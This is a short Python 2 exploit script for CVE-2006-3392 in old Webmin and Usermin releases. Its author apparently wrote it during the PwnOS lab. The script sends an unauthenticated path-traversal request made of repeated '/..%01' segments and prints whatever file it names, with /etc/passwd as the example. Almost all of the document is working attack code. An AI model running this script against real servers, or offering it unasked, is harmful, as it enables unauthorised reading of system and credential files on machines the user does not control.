#!/usr/bin/python
# Exploit for WEBMIN and USERMIN less than 1.29x
# CVE: 2006-3392
# Referenced from UmZ!'s Perl Code created on 13th July 2006
# Write this code duing working on PwnOSv1
# Coded by rat3l - email: rat3l at protonmail dot com
# Thanks UmZ!
# code usage webmin.py <host> <port> <filename> <http or https>


import time, struct, sys
import requests

try:
    server = sys.argv[1]
    port = sys.argv[2]
    filename = sys.argv[3]
    tar = sys.argv[4]
except IndexError:
    print "[+] Define your target with file name, my lord"
    print "[+] Usage %s <host> <port> <filename> <http or https> " % sys.argv[0]
    print "[+] Example: %s <192.168.1.1> <10000> </etc/passwd> <0 or 1>" % sys.argv[0]
    sys.exit()

if tar == '0':
    req = "/..%01" * 40
    r = requests.get('http://'+ server+':'+port+'/unauthenticated/'+req+ filename)
    try:
            r
            print (r.content)

    except:
               print "[!] Please, try again my lord"

    r.close()
elif tar == '1':
    req = "/..%01" * 40
    r = requests.get('https://'+ server+':'+port+'/unauthenticated/'+req+ filename)
    try:
            r
            print (r.content)

    except:
               print "[!] Please, try again my lord"
    r.close()
else:
    print '[!] Failed: Please make sure if your target is HTTP / HTTPS '
